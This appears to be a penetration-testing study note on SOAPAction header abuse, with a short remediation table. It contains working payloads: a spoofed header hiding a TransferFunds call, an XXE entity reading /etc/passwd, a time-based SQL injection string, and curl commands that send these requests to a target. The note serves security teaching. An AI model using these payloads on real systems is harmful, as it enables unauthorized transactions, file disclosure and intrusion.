---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.25 SOAPAction — SOAP Injection"
---

# 03.25 — SOAPAction

## What is it?

`SOAPAction` is an HTTP header used with SOAP (Simple Object Access Protocol) web services. It tells the server which SOAP operation to invoke. If the server uses `SOAPAction` to authorize operations but the actual SOAP body is processed differently, attackers can spoof which operation appears to be called.

---

## SOAP Request with SOAPAction

```
POST /service HTTP/1.1
Host: target.com
Content-Type: text/xml; charset=utf-8
SOAPAction: "GetBalance"

<?xml version="1.0"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetBalance>
      <accountId>12345</accountId>
    </GetBalance>
  </soap:Body>
</soap:Envelope>
```

---

## Attack 1: SOAPAction Spoofing

```
SCENARIO:
  Server uses SOAPAction for logging/authorization.
  Body also specifies the operation.
  Server trusts one but processes another.

ATTACK:
  SOAPAction: "GetBalance"    ← authorization check sees this
  
  Body:
  <TransferFunds>             ← but server executes this!
    <from>12345</from>
    <to>attacker</to>
    <amount>10000</amount>
  </TransferFunds>
  
  If server authorizes based on SOAPAction but executes based on body:
  → Unauthorized operation executed!
```

---

## Attack 2: XXE via SOAP Body

```
SOAP accepts XML → XXE is possible!

SOAPAction: "GetUser"
Content-Type: text/xml

<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <GetUser>
      <username>&xxe;</username>
    </GetUser>
  </soap:Body>
</soap:Envelope>
```

---

## Attack 3: SQL Injection via SOAP Parameters

```
SOAPAction: "GetUser"

<GetUser>
  <username>' OR SLEEP(5)--</username>
</GetUser>

→ If backend uses parameter in SQL without sanitization → SQLi!
```

---

## Attack 4: WSDL Discovery (Endpoint Enumeration)

```
WSDL (Web Services Description Language) exposes all SOAP operations!

GET /service?wsdl HTTP/1.1    ← common WSDL endpoint
GET /service.asmx?wsdl
GET /service.svc?wsdl

WSDL reveals:
  - All available operations (like API docs)
  - Parameter names and types
  - Target namespaces
  
Use wsdl2py or soapui to parse WSDL and auto-generate requests.
```

---

## Testing

```bash
# Discover WSDL
curl https://target.com/service?wsdl
curl https://target.com/service.asmx?wsdl

# Send SOAP request with XXE
curl -X POST https://target.com/service \
  -H "Content-Type: text/xml" \
  -H 'SOAPAction: "GetUser"' \
  -d '<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body><GetUser><username>&xxe;</username></GetUser></soap:Body>
</soap:Envelope>'

# SOAPAction spoofing (change action header but keep different body)
curl -X POST https://target.com/service \
  -H 'SOAPAction: "GetBalance"' \
  -H "Content-Type: text/xml" \
  -d '<soap:Envelope ...><soap:Body><Admin>...</Admin></soap:Body></soap:Envelope>'
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| SOAPAction vs body mismatch | Validate that SOAPAction matches the operation in the body |
| XXE in SOAP | Disable external entity processing in XML parser |
| WSDL exposed publicly | Restrict WSDL access to authorized clients |

---

## Related Notes
- [[02.25 - SOAP and WSDL]] — full SOAP protocol guide
- [[Module 05 - XXE]] — XXE exploitation via SOAP
- [[Module 01 - SQL Injection]] — SQLi via SOAP parameters
